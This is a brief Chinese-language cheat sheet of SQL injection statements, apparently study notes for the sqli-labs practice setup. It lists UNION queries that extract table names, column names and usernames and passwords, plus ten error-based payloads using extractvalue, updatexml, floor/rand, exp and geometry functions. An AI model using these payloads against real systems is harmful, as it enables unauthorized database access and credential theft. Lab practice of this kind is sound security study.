一、sql注入语句

1.使用环境

php5.5.9，mysql5.7.26，sqli文件夹，在WWW下装sqli文件，开启apache服务并访问sqli，初始化数据库

2.所用语句

  • mysql -u root -p 登录数据库的shell
  • show databases 展示所有库
  • use 库名 使用库名
  • show tables 展示该库下的所有表名
  • select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=’users’ and table_schema=database(); – - 获得字段名
  • select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database(); 获得表名
  • select group_concat(id,”“,username,”“,password) from users ;获得账号密码

报错语句（前4常用）：

  • (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)
  • (extractvalue(1,concat(0x7e,(select user()),0x7e)))
  • (updatexml(1,concat(0x7e,(select user()),0x7e),1))
  • exp(~(select * from(select user())a))
  • geometrycollection((select * from(select * from(select user())a)b))
  • multipoint((select * from(select * from(select user())a)b))
  • polygon((select * from(select * from(select user())a)b))
  • multipolygon((select * from(select * from(select user())a)b))
  • linestring((select * from(select * from(select user())a)b))
  • multilinestring((select * from(select * from(select user())a)b))
